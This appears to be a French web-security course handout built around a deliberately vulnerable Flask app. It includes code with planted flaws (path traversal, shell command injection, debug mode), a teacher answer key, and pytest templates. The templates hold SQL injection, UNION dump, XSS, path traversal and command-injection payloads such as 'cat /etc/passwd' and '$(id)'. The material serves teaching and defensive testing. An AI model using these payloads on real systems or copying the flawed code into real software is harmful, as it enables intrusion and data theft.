    filename = request.args.get('filename', 'export.csv')
    filepath = os.path.join('/app/exports', filename)          # ligne 116 🚨 VULN #7

    if os.path.exists(filepath):
        with open(filepath, 'r') as f:                        # ligne 118 🚨 VULN #7
            content = f.read()
        return content, 200, {'Content-Type': 'text/plain'}

    return jsonify({'error': 'File not found'}), 404


# ── Notifications ─────────────────────────────────────────────
@app.route('/api/notify', methods=['POST'])
def send_notification():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json()
    email = data.get('email', '')

    # Envoi de notification par email via sendmail
    os.system(f"sendmail -t {email} < /app/templates/notification.txt")  # ligne 133 🚨 VULN #8

    return jsonify({'status': 'sent'})


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')                       # ligne 138 🚨 VULN #9
```

---

### 📝 Grille de réponse — Exercice 2.A

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  Nom / Prénom : ________________________________  Date : __________________ │
│  Durée restante : [  ] 45 min  [  ] 30 min  [  ] 15 min                    │
└─────────────────────────────────────────────────────────────────────────────┘
```

Pour chaque vulnérabilité (1 à 9) :

```
Ligne(s)     : _______
Nom          : ________________________________________________
CWE          : CWE-_______
CVSS Score   : _______ / 10   Vecteur : AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_
Impact       : ________________________________________________

Correction :
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│                                                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

### ✅ Corrigé enseignant — Exercice 2.A

```
⚠️  NE PAS DISTRIBUER AUX ÉTUDIANTS AVANT LA FIN DE LA SÉANCE
```

| # | Ligne(s) | Vulnérabilité | CWE | CVSS | Correction |
|---|----------|---------------|-----|------|------------|
| 1 | 8 | Secret key statique | CWE-321 | 7.5 | `os.environ.get('SECRET_KEY')` |
| 2 | 23 | MD5 pour hash password | CWE-327 | 8.1 | `bcrypt.generate_password_hash()` |
| 3 | 29-32 | Injection SQL (login) | CWE-89 | 9.8 | `User.query.filter_by()` ORM |
| 4 | 52 | IDOR (get_order) | CWE-639 | 7.5 | Filtrer par `user_id=session['user_id']` |
| 5 | 77-82 | Mass Assignment | CWE-915 | 8.1 | Allowlist + forcer `user_id=session['user_id']` |
| 6 | 98+107 | SSTI | CWE-1336 | 9.8 | `render_template()` avec variable séparée |
| 7 | 116-118 | Path Traversal | CWE-22 | 8.6 | `secure_filename()` + `realpath()` check |
| 8 | 133 | Command Injection | CWE-78 | 9.8 | `subprocess` list form, `shell=False` |
| 9 | 138 | Debug mode en production | CWE-94 | 5.3 | `debug=False`, variable d'env |

```
Note : 9 vulnérabilités attendues
→ Trouver 6+ = note maximale (toutes les vulns majeures couvertes)
→ Trouver 8-9 = bonus +5 pts
```

> **📚 Ressource d'aide** : Si vous êtes bloqué, consultez `docs/guide_correction.md` — ce guide contient des indices progressifs pour chaque vulnérabilité.

---

## Exercice 2.B — Audit & Tests de Sécurité (Binôme, 1 semaine)

```
┌─────────────────────────────────────────────────────────────┐
│  Durée : 1h30 en séance + 1 semaine pour finalisation       │
│  Rendu : dépôt Git privé + rapport PDF                      │
│  Pondération : 25% de la note finale                        │
└─────────────────────────────────────────────────────────────┘
```

### 🎯 Objectifs

- Conduire un audit de sécurité structuré avec méthodologie OWASP
- Rédiger des tests de sécurité automatisés avec pytest
- Utiliser des outils d'analyse statique (Bandit, Safety)
- Produire un rapport d'audit professionnel

---

### 📋 PARTIE A — Audit outillé (40 pts)

#### A1 — Analyse statique avec Bandit *(10 pts)*

```bash
# Installation
pip install bandit

# Analyse du projet (branche vulnérable)
git checkout student-starter
bandit -r . -x ./tests -f json -o bandit_report.json
bandit -r . -x ./tests -f txt  -o bandit_report.txt

# Visualisation
cat bandit_report.txt
```

**Travail attendu :**

```markdown
## Rapport Bandit

### Statistiques
- Fichiers analysés : X
- Issues HIGH severity : X
- Issues MEDIUM severity : X
- Issues LOW severity : X

### Top 5 des issues critiques

| Rank | Fichier | Ligne | Issue | Sévérité | CWE |
|------|---------|-------|-------|----------|-----|
| 1    |         |       |       |          |     |
| 2    |         |       |       |          |     |
...

### Faux positifs identifiés
[Issues Bandit qui ne sont PAS de vraies vulnérabilités + justification]

### Faux négatifs identifiés
[Vulnérabilités connues que Bandit N'A PAS détectées + explication]
```

---

#### A2 — Analyse des dépendances avec Safety *(10 pts)*

```bash
# Installation
pip install safety

# Analyse
safety check -r requirements.txt --json > safety_report.json
safety check -r requirements.txt

# Alternative : pip-audit
pip install pip-audit
pip-audit -r requirements.txt
```

**Travail attendu :**

```markdown
## Rapport Safety / pip-audit

### Dépendances vulnérables identifiées

| Package | Version actuelle | CVE | Sévérité | Description | Fix disponible |
|---------|-----------------|-----|----------|-------------|----------------|
|         |                 |     |          |             |                |

### Recommandations
[Pour chaque CVE : mettre à jour vers X.X.X ou mesure de mitigation]

### requirements.txt mis à jour
[Fournir le fichier avec versions corrigées]
```

---

#### A3 — Tests manuels OWASP Top 10 *(20 pts)*

Tester chaque catégorie OWASP sur l'application :

```markdown
## Checklist OWASP Top 10 2021

### A01 - Broken Access Control
- [ ] IDOR sur /api/orders/<id>
- [ ] Élévation de privilèges via mass assignment
- [ ] Accès direct à /admin sans authentification

Test effectué : ________________________________
Résultat : Vulnérable ✅ / Non vulnérable ❌
Preuve : [screenshot/payload]

### A02 - Cryptographic Failures
- [ ] Algorithme de hashage des mots de passe
- [ ] Transmission en clair (HTTP vs HTTPS)
- [ ] Clés secrètes en dur dans le code

Test effectué : ________________________________
Résultat : Vulnérable ✅ / Non vulnérable ❌

### A03 - Injection
- [ ] SQL Injection (login, search, API)
- [ ] Command Injection (/ping, /notify)
- [ ] SSTI (/hello, /admin/report)

Test effectué : ________________________________
Résultat : Vulnérable ✅ / Non vulnérable ❌

### A04 - Insecure Design
- [ ] Absence de rate limiting sur /login
- [ ] Pas de politique de mots de passe
- [ ] Gestion d'erreurs exposant des infos

### A05 - Security Misconfiguration
- [ ] Debug mode actif
- [ ] Headers de sécurité manquants
- [ ] Cookies sans flags Secure/HttpOnly

### A06 - Vulnerable Components
[Résultats Safety/pip-audit]

### A07 - Auth Failures
- [ ] Brute-force possible sur /login
- [ ] Session non invalidée à la déconnexion
- [ ] Tokens prévisibles

### A08 - Software & Data Integrity
- [ ] Absence vérification intégrité uploads
- [ ] CSRF sur les formulaires

### A09 - Logging Failures
- [ ] Tentatives d'authentification non loguées
- [ ] Informations sensibles dans les logs
- [ ] Pas d'alerting sur comportements suspects

### A10 - SSRF
- [ ] Tester si l'app fait des requêtes vers URLs fournies par l'utilisateur
```

---

### 📋 PARTIE B — Tests automatisés pytest *(40 pts)*

Compléter le fichier `tests/test_security_student.py` :

```python
# tests/test_security_student.py
"""
Tests de sécurité à compléter.
Objectif : 100% des tests doivent ÉCHOUER sur la branche vulnérable
           et PASSER sur la branche remediated.
"""
import pytest
import re
from app import create_app, db
from models import User, Comment, Order


@pytest.fixture
def app():
    app = create_app('testing')
    with app.app_context():
        db.create_all()
        # Créer utilisateurs de test
        alice = User(email='alice@vulnpyapp.local', username='alice', is_admin=False)
        alice.set_password('Alice123!')
        bob = User(email='bob@vulnpyapp.local', username='bob', is_admin=False)
        bob.set_password('Bobby123!')
        admin = User(email='admin@vulnpyapp.local', username='admin', is_admin=True)
        admin.set_password('Admin123!')
        db.session.add_all([alice, bob, admin])
        db.session.commit()
        yield app
        db.drop_all()


@pytest.fixture
def client(app):
    return app.test_client()


@pytest.fixture
def alice_client(client):
    """Client connecté en tant qu'alice"""
    client.post('/login', data={
        'email': 'alice@vulnpyapp.local',
        'password': 'Alice123!'
    })
    return client


# ═══════════════════════════════════════════════════════════════
# SECTION 1 — SQL INJECTION (20 pts)
# ═══════════════════════════════════════════════════════════════

class TestSQLInjection:

    def test_login_sqli_bypass_blocked(self, client):
        """
        TODO : Vérifier que le payload SQLi de bypass est bloqué.
        Le payload ' OR '1'='1' -- ne doit pas permettre la connexion.
        Assertion attendue : status_code == 401 ou redirection vers login
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        payload = {
            'email': "' OR '1'='1' --",
            'password': 'anything'
        }
        response = ...  # effectuer la requête POST /login
        assert ...      # vérifier que la connexion est refusée
        # ───────────────────────────────────────────────────────

    def test_login_sqli_comment_blocked(self, client):
        """
        TODO : Tester le payload avec commentaire SQL '--'
        L'email admin'-- ne doit pas permettre la connexion.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        pass
        # ───────────────────────────────────────────────────────

    def test_search_union_injection_blocked(self, alice_client):
        """
        TODO : Vérifier que l'injection UNION sur /search est bloquée.
        Le payload UNION SELECT ne doit pas retourner des données
        de la table 'user' dans les résultats de recherche.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        sqli_payload = "' UNION SELECT id,email,password_hash,4,5 FROM user--"
        response = ...
        data = response.get_data(as_text=True)
        # Vérifier qu'aucun email @vulnpyapp.local n'apparaît dans les résultats
        assert ...
        # ───────────────────────────────────────────────────────

    def test_search_normal_query_works(self, alice_client):
        """
        TODO : S'assurer que la recherche normale fonctionne toujours
        après correction (test de non-régression).
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        pass
        # ───────────────────────────────────────────────────────

    def test_api_blind_sqli_boolean_blocked(self, alice_client, app):
        """
        TODO : Vérifier que l'injection booléenne est bloquée sur
        /api/users/<id>. Les deux requêtes suivantes doivent retourner
        le même résultat (pas de différence exploitable).
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        pass
        # ───────────────────────────────────────────────────────


@pytest.fixture
def get_csrf_token(alice_client):
    """Récupère le token CSRF depuis la page /comments"""
    from bs4 import BeautifulSoup
    response = alice_client.get('/comments')
    soup = BeautifulSoup(response.data, 'html.parser')
    token = soup.find('input', {'name': 'csrf_token'})
    return token.get('value') if token else ''


# ═══════════════════════════════════════════════════════════════
# SECTION 2 — XSS (20 pts)
# ═══════════════════════════════════════════════════════════════

class TestXSS:

    def test_xss_reflected_search_escaped(self, alice_client):
        """
        TODO : Vérifier que le XSS réfléchi sur /search est échappé.
        La balise <script> doit apparaître encodée dans la réponse HTML,
        pas comme balise HTML active.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        xss_payload = '<script>alert(1)</script>'
        response = alice_client.get(f'/search?q={xss_payload}')
        data = response.get_data(as_text=True)

        # La balise ne doit PAS être présente telle quelle
        assert '<script>alert(1)</script>' not in data

        # Elle doit être encodée (au moins l'une de ces formes)
        assert '&lt;script&gt;' in data or 'alert' not in data
        # ───────────────────────────────────────────────────────

    def test_xss_stored_bleach_sanitized(self, alice_client, app):
        """
        TODO : Poster un commentaire avec payload XSS et vérifier
        qu'il est sanitisé par Bleach avant stockage ET affichage.
        Les attributs 'onerror', 'onload', 'onclick' doivent être supprimés.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        xss_payload = '<img src="x" onerror="alert(document.cookie)">'

        # Poster le commentaire
        post_response = ...

        # Récupérer la page des commentaires
        get_response = ...
        data = get_response.get_data(as_text=True)

        # L'attribut onerror ne doit pas être présent
        assert 'onerror' not in data
        assert 'alert' not in data
        # ───────────────────────────────────────────────────────

    def test_xss_allowed_tags_preserved(self, alice_client):
        """
        TODO : Vérifier que les tags HTML autorisés par Bleach
        sont bien conservés (b, i, em, strong).
        Test de non-régression : les mises en forme légitimes fonctionnent.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        pass
        # ───────────────────────────────────────────────────────

    def test_xss_script_tag_variants_blocked(self, alice_client, get_csrf_token):
        """
        TODO : Tester plusieurs variantes de payloads XSS.
        Tous doivent être bloqués/échappés.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        variants = [
            '<script>alert(1)</script>',
            '<SCRIPT>alert(1)</SCRIPT>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            'javascript:alert(1)',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
        ]
        for payload in variants:
            response = alice_client.post('/comments', data={
                'content': payload,
                'csrf_token': get_csrf_token
            })
            # Vérifier que le payload n'est pas exécutable dans la réponse
            # ─── À COMPLÉTER ─────────────────────────────────
            pass
        # ───────────────────────────────────────────────────────

    def test_csp_header_present(self, client):
        """
        TODO : Vérifier que le header Content-Security-Policy
        est présent dans les réponses et contient les directives minimales.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        response = client.get('/')
        csp = response.headers.get('Content-Security-Policy', '')

        assert csp != '', "CSP header manquant"
        assert "default-src" in csp or "script-src" in csp
        assert "unsafe-inline" not in csp, "unsafe-inline interdit dans script-src"
        # ───────────────────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════
# SECTION 3 — AUTHENTIFICATION & SESSIONS (20 pts)
# ═══════════════════════════════════════════════════════════════

class TestAuthentication:

    def test_password_not_md5(self, app):
        """
        TODO : Vérifier que les mots de passe ne sont pas hashés en MD5.
        Un hash MD5 fait 32 caractères hexadécimaux.
        Un hash bcrypt commence par $2b$.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        with app.app_context():
            user = User.query.filter_by(email='alice@vulnpyapp.local').first()
            pwd_hash = user.password_hash

            # Ne doit pas être MD5 (32 hex chars)
            assert not re.match(r'^[a-f0-9]{32}$', pwd_hash), \
                "MD5 détecté ! Utiliser bcrypt."

            # Doit être bcrypt
            assert pwd_hash.startswith('$2b$') or pwd_hash.startswith('$2a$'), \
                "Le hash doit être bcrypt."
        # ───────────────────────────────────────────────────────

    def test_rate_limiting_login(self, client):
        """
        TODO : Vérifier que le rate limiting est en place sur /login.
        Après N tentatives échouées, l'application doit retourner 429.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        failed_attempts = 0
        got_rate_limited = False

        for i in range(10):
            response = client.post('/login', data={
                'email': 'alice@vulnpyapp.local',
                'password': f'wrong_password_{i}'
            })
            if response.status_code == 429:
                got_rate_limited = True
                break
            failed_attempts += 1

        assert got_rate_limited, \
            f"Rate limiting non déclenché après {failed_attempts} tentatives"
        # ───────────────────────────────────────────────────────

    def test_session_cookie_httponly(self, client):
        """
        TODO : Vérifier que le cookie de session a le flag HttpOnly.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        client.post('/login', data={
            'email': 'alice@vulnpyapp.local',
            'password': 'Alice123!'
        })
        cookies = client.cookie_jar
        for cookie in cookies:
            if 'session' in cookie.name.lower() or 'sid' in cookie.name.lower():
                assert cookie.has_nonstandard_attr('HttpOnly') or \
                       getattr(cookie, '_rest', {}).get('HttpOnly') is not None, \
                    "Cookie de session sans flag HttpOnly"
        # ───────────────────────────────────────────────────────

    def test_session_invalidated_on_logout(self, alice_client):
        """
        TODO : Vérifier que la session est bien invalidée après logout.
        Une requête authentifiée après logout doit retourner 401 ou redirect.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        # Vérifier qu'on est bien connecté
        response_before = alice_client.get('/profile')
        assert response_before.status_code == 200

        # Se déconnecter
        alice_client.get('/logout')

        # Une route protégée doit être inaccessible
        response_after = alice_client.get('/profile')
        assert response_after.status_code in [302, 401], \
            "Session toujours valide après logout"
        # ───────────────────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════
# SECTION 4 — CONTRÔLE D'ACCÈS (20 pts)
# ═══════════════════════════════════════════════════════════════

class TestAccessControl:

    def test_idor_order_access_blocked(self, app, client):
        """
        TODO : Alice ne doit pas pouvoir accéder à la commande de Bob.
        Créer une commande pour Bob, tenter d'y accéder avec Alice.
        Résultat attendu : 403 ou 404.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        with app.app_context():
            # Récupérer les IDs
            alice = User.query.filter_by(email='alice@vulnpyapp.local').first()
            bob   = User.query.filter_by(email='bob@vulnpyapp.local').first()

            # Créer une commande appartenant à Bob
            bob_order = Order(
                user_id=bob.id,
                product='Secret Product',
                amount=999.99
            )
            db.session.add(bob_order)
            db.session.commit()
            bob_order_id = bob_order.id

        # Connecter Alice
        client.post('/login', data={
            'email': 'alice@vulnpyapp.local',
            'password': 'Alice123!'
        })

        # Alice tente d'accéder à la commande de Bob
        response = client.get(f'/api/orders/{bob_order_id}')
        assert response.status_code in [403, 404], \
            f"IDOR : Alice peut accéder à la commande de Bob ! (status {response.status_code})"
        # ───────────────────────────────────────────────────────

    def test_mass_assignment_is_admin_blocked(self, client):
        """
        TODO : Vérifier que l'inscription avec is_admin=true
        ne crée pas un compte administrateur.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        response = client.post('/register', data={
            'email': 'hacker@test.com',
            'username': 'hacker',
            'password': 'Hack123!',
            'bio': 'innocent bio',
            'is_admin': 'true',      # tentative de mass assignment
            'role': 'admin',         # autre tentative
        })

        # Vérifier que le compte créé n'est PAS admin
        # ─── À COMPLÉTER ─────────────────────────────────────
        pass
        # ───────────────────────────────────────────────────────

    def test_admin_panel_requires_admin_role(self, alice_client):
        """
        TODO : Vérifier que /admin est inaccessible à un utilisateur normal.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        response = alice_client.get('/admin')
        assert response.status_code in [302, 403], \
            "Panel admin accessible à un utilisateur non-admin"
        # ───────────────────────────────────────────────────────

    def test_csrf_protection_active(self, alice_client):
        """
        TODO : Vérifier que les requêtes POST sans token CSRF sont rejetées.
        Une requête POST /profile/update sans csrf_token doit retourner 400.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        response = alice_client.post('/profile/update', data={
            'username': 'newname'
            # Pas de csrf_token intentionnellement
        })
        assert response.status_code == 400, \
            "Requête sans CSRF token acceptée !"
        # ───────────────────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════
# SECTION 5 — INJECTIONS AVANCÉES (BONUS - 10 pts)
# ═══════════════════════════════════════════════════════════════

class TestAdvancedInjections:

    def test_ssti_blocked(self, client):
        """
        TODO : Vérifier que le SSTI sur /hello est bloqué.
        Le payload {{ 7*7 }} ne doit pas retourner 49.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        response = client.get('/hello?name={{ 7*7 }}')
        data = response.get_data(as_text=True)
        assert '49' not in data, \
            "SSTI détecté : {{ 7*7 }} a été évalué → résultat 49"
        # ───────────────────────────────────────────────────────

    def test_path_traversal_blocked(self, alice_client):
        """
        TODO : Vérifier que le path traversal sur /download est bloqué.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        payloads = [
            '../../../etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '....//....//etc/passwd',
        ]
        for payload in payloads:
            response = alice_client.get(f'/download?filename={payload}')
            assert response.status_code in [400, 403, 404], \
                f"Path traversal possible avec : {payload}"
            # Le contenu /etc/passwd ne doit jamais apparaître
            assert 'root:' not in response.get_data(as_text=True)
        # ───────────────────────────────────────────────────────

    def test_command_injection_blocked(self, alice_client, get_csrf_token):
        """
        TODO : Vérifier que l'injection de commande sur /ping est bloquée.
        """
        # ─── À COMPLÉTER ───────────────────────────────────────
        cmd_payloads = [
            'localhost; id',
            'localhost && cat /etc/passwd',
            '$(id)',
            '`id`',
            'localhost | whoami',
        ]
        for payload in cmd_payloads:
            response = alice_client.post('/ping', data={
                'host': payload,
                'csrf_token': get_csrf_token
            })
            data = response.get_data(as_text=True)
            # La sortie de la commande 'id' ne doit pas apparaître
            assert 'uid=' not in data, \
                f"Command injection réussie avec : {payload}"
        # ───────────────────────────────────────────────────────
```

---

### 📋 PARTIE C — Rapport d'audit *(20 pts)*

```markdown
# Template rapport_audit.md

# Rapport d'Audit de Sécurité — VulnPyApp
**Auditeurs :** Prénom NOM 1 / Prénom NOM 2
**Date :** JJ/MM/AAAA
**Version auditée :** student-starter (branche Git : student-starter)
**Méthode :** OWASP Testing Guide v4.2

---

## 1. Résumé exécutif

### 1.1 Périmètre
Application Flask de démonstration, déployée localement via Docker.
URL : http://localhost:5000

### 1.2 Résultats en bref

| Sévérité | Nombre | Exemples |
|----------|--------|---------|
| Critique | X      |         |
| Élevée   | X      |         |
| Moyenne  | X      |         |
| Faible   | X      |         |
| Info     | X      |         |

### 1.3 Score de risque global
[Justification en 3-5 lignes]

---

## 2. Vulnérabilités identifiées

### VULN-001 — [Nom] — [Sévérité]

| Champ | Valeur |
|-------|--------|
| ID | VULN-001 |
| Titre | |
| CWE | CWE-XXX |
| CVSS v3.1 | X.X (Vecteur : ...) |
| Fichier | app.py:XX |
| Découverte par | Revue manuelle / Bandit / Test |

**Description :**
[Explication technique de la vulnérabilité]

**Preuve de concept :**
```
[Payload ou commande démontrant la vulnérabilité]
```

**Impact :**
[Ce qu'un attaquant peut faire]

**Recommandation :**
[Code ou configuration corrigée]

---

## 3. Résultats Bandit

[Copier-coller le résumé + analyse des faux positifs/négatifs]

## 4. Résultats Safety / pip-audit

[CVE identifiées dans les dépendances + plan de mise à jour]

## 5. Résultats pytest

```
Résultats branche vulnérable :
  FAILED tests/ ... XX tests
  PASSED tests/ ...  X tests

Résultats branche remediated :
  PASSED tests/ ... XX tests
```

## 6. Recommandations priorisées

| Priorité | Action | Effort | Impact |
|----------|--------|--------|--------|
| P1 | | Faible/Moyen/Élevé | Critique |
| P2 | | | |
...

## 7. Conclusion

[Évaluation globale du niveau de sécurité + points positifs]
```

---

### ⚖️ Grille d'évaluation — Exercice 2.B

```
┌────────────────────────────────────────────────────────────────────┐
│                       GRILLE D'ÉVALUATION                          │
│                Audit & Tests de Sécurité — Séance 2                │
├──────────────────────────────────────┬────────┬────────────────────┤
│ Critère                              │ Points │ Barème détaillé    │
├──────────────────────────────────────┼────────┼────────────────────┤
│ PARTIE A — Audit outillé             │ /40    │                    │
│  A1 - Rapport Bandit complet         │ /10    │ Stats + analyse FP │
│  A2 - Rapport Safety/pip-audit       │ /10    │ CVE + fix proposé  │
│  A3 - Checklist OWASP Top 10         │ /20    │ 2pt par catégorie  │
├──────────────────────────────────────┼────────┼────────────────────┤
│ PARTIE B — Tests pytest              │ /40    │                    │
│  Section 1 - SQLi (5 tests)          │ /10    │ 2pt par test       │
│  Section 2 - XSS (5 tests)           │ /10    │ 2pt par test       │
│  Section 3 - Auth (4 tests)          │ /10    │ 2.5pt par test     │
│  Section 4 - Access Control (4 tests)│ /10    │ 2.5pt par test     │
├──────────────────────────────────────┼────────┼────────────────────┤
│ PARTIE C — Rapport d'audit           │ /20    │                    │
│  Structure et clarté                 │ /5     │                    │
│  Qualité technique des analyses      │ /10    │                    │
│  Recommandations pertinentes         │ /5     │                    │
├──────────────────────────────────────┼────────┼────────────────────┤
│ BONUS                                │        │                    │
│  Section 5 - Tests avancés (3 tests) │ +10    │                    │
│  Pipeline CI/CD intégré              │ +5     │                    │
│  Rapport au format PDF professionnel │ +3     │                    │
├──────────────────────────────────────┼────────┼────────────────────┤
│ TOTAL                                │ /100   │                    │
└──────────────────────────────────────┴────────┴────────────────────┘

Pénalités :
  - Tests copiés/identiques sans adaptation   : -20 pts
  - Rapport < 2 pages                         : -10 pts
  - Dépôt Git absent ou non accessible        : -15 pts
  - Retard (>24h)                             : -10 pts/jour
```

> **📚 Ressource d'aide** : Si vous êtes bloqué sur une vulnérabilité, consultez `docs/guide_correction.md` — ce guide contient des indices progressifs et des solutions complètes pour les 15 vulnérabilités.

---

# 📚 Pour aller plus loin

## ReDoS — Regular Expression Denial of Service

**Concept** : Certaines expressions régulières ont une complexité exponentielle sur des inputs spécifiques, ce qui peut bloquer le serveur pendant plusieurs minutes.

**Exemple de regex vulnérable** :

```python
import re

# ❌ DANGEREUX - Backtracking catastrophique
EMAIL_REGEX = re.compile(r'^([a-zA-Z0-9]+)+@example\.com$')

# Cette validation peut prendre plusieurs minutes sur un input crafté
malicious_input = "a" * 30 + "!"  # Cause un backtracking exponentiel O(2^n)
```

**Protections** :

```python
# ✅ Utiliser re2 (sans backtracking)
import re2
safe_regex = re2.compile(r'^([a-zA-Z0-9]+)+@example\.com$')

# ✅ Ajouter un timeout
import signal

def safe_regex_match(pattern, text, timeout=1):
    def timeout_handler(signum, frame):
        raise TimeoutError("Regex match timeout")
    
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)
    try:
        result = re.match(pattern, text)
        signal.alarm(0)
        return result
    except TimeoutError:
        return None

# ✅ Limiter la taille d'input
def is_valid_email(email):
    if len(email) > 254:  # RFC 5321
        return False
    return bool(EMAIL_REGEX.match(email))

# ✅ Utiliser des validateurs spécialisés (meilleur)
from email_validator import validate_email

def is_valid_email(email):
    try:
        validate_email(email)
        return True
    except EmailNotValidError:
        return False
```

---

## 📅 Récapitulatif des rendus

```
┌───────────────────────────────────────────────────────────────────┐
│                    CALENDRIER DES RENDUS                          │
├─────────────┬──────────────────────────┬────────────┬────────────┤
│ Exercice    │ Description              │ Deadline   │ Poids      │
├─────────────┼──────────────────────────┼────────────┼────────────┤
│ 1.A         │ Lab guidé (en séance)    │ Séance 1   │ -          │
│ 1.B         │ CTF SQLi & XSS           │ S1 + 7j    │ 20%        │
│ 1.C         │ Quiz fondamentaux (QCM)  │ Fin séance │ 10%        │
│ 2.A         │ Revue de code (en séance)│ Séance 2   │ 15%        │
│ 2.B         │ Audit + pytest           │ S2 + 7j    │ 25%        │
│ 3 (projet)  │ Sécurisation app Django  │ S3 + 14j   │ 30%        │
├─────────────┼──────────────────────────┼────────────┼────────────┤
│ TOTAL       │                          │            │ 100%       │
└─────────────┴──────────────────────────┴────────────┴────────────┘

Format de rendu : Archive ZIP nommée <NOM1>_<NOM2>_<exercice>.zip
Plateforme     : Moodle (lien fourni par l'enseignant)
Contact        : securite@institution.fr
```